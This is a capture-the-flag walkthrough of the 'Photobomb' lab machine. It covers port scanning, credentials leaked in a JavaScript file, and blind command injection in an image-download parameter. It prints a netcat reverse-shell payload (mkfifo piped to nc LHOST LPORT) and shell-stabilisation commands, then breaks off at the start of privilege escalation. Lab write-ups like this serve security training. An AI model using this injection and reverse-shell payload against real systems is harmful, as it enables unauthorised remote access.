# Box: Photobomb
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A -v -p- -T4 10.129.228.60```

```
Nmap scan report for 10.129.228.60
Host is up, received conn-refused (0.22s latency).
Scanned at 2023-11-03 11:35:47 WAT for 17s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwlzrcH3g6+RJ9JSdH4fFJPibAIpAZXAl7vCJA+98jmlaLCsANWQXth3UsQ+TCEf9YydmNXO2QAIocVR8y1NUEYBlN2xG4/7txjoXr9QShFwd10HNbULQyrGzPaFEN2O/7R90uP6lxQIDsoKJu2Ihs/4YFit79oSsCPMDPn8XS1fX/BRRhz1BDqKlLPdRIzvbkauo6QEhOiaOG1pxqOj50JVWO3XNpnzPxB01fo1GiaE4q5laGbktQagtqhz87SX7vWBwJXXKA/IennJIBPcyD1G6YUK0k6lDow+OUdXlmoxw+n370Knl6PYxyDwuDnvkPabPhkCnSvlgGKkjxvqks9axnQYxkieDqIgOmIrMheEqF6GXO5zz6WtN62UAIKAgxRPgIW0SjRw2sWBnT9GnLag74cmhpGaIoWunklT2c94J7t+kpLAcsES6+yFp9Wzbk1vsqThAss0BkVsyxzvL0U9HvcyyDKLGFlFPbsiFH7br/PuxGbqdO9Jbrrs9nx60=
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBrVE9flXamwUY+wiBc9IhaQJRE40YpDsbOGPxLWCKKjNAnSBYA9CPsdgZhoV8rtORq/4n+SO0T80x1wW3g19Ew=
|   256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEp8nHKD5peyVy3X3MsJCmH/HIUvJT+MONekDg5xYZ6D
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:36
Completed NSE at 11:36, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:36
Completed NSE at 11:36, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:36
Completed NSE at 11:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.44 seconds
```
From our scan we have 2 open ports, port 22 which runs ssh and port 80 which runs the http service. We'll focus our enumeration today on port 80



# Enumeration 

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0fcf1328-eb02-4db2-bdec-2ee756a13210)

Add this domain name to your ```/etc/hosts``` file

Navigate to the webpage again,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fccaf5e2-9374-4900-b2f5-c8cedafbd0c8)

Checking the page source you should see a javascript file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/61c96aef-26d7-42e6-9987-0ed626b87765)

Yeah, lets view the content of this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dbc66313-f912-4af1-9284-65132e5079eb)

Now, that looks like creds

Something like

username:```pH0t0```        password:```b0Mb!```

Clicking on the "click here" directs you to the ```/printer``` directory which requires creds to login, we'll be using the creds we found in the javascript file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a8b7b7db-a3d6-4b5f-b90f-0906920396b8)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/526cd9e9-a8c1-44e0-a73e-af746ee57b49)

nice nice, we are logged in

This webpage just allows us to download an image so we can print it

Lets try to download an image, but this time we'll capture the request using burpsuite and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/adccd678-580d-4ebd-9e25-a2a150a12ae9)

We can see there are 3 parameters ```photo```, ```filetype``` and ```dimensions```

The parameter ```filetype``` is actually vulnerable to blind command injection. Lets exploit this



# Exploitation

Lets try to cause a 10 seconds delay

payload:```;ping+-c+10+127.0.0.1```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4a92c2c6-bbb5-4a88-bc71-daad095fbdaf)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/19fb9a4c-e271-4ca0-a6a4-e23e4f6a291d)

This actually caused a 10 secinds delay

Lets spawn a reverse shell with this

payload:```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f```

Ensure you edit the ```LHOST``` and ```LPORT```, also ensure it is url encoded

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/980d47d2-c705-47da-911b-bd4dc92a770f)

Checking my netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c0f833af-09a2-49ae-8b5c-6009aed9ba3e)

nice nice, lets stabilize our shell

```
python3 -c "import pty;pty.spawn('/bin/bash')"
ctrl + z (To Background)
stty raw -echo && fg
export TERM=xterm
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7e1ac6db-6b79-4530-ab1a-c637e0dd4a93)

We can go ahead now to escalate our privileges




# Privilege Escalation

Running the ```sudo -l``` command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/71d174e6-59dd-4509-9454-31593d9565df)



























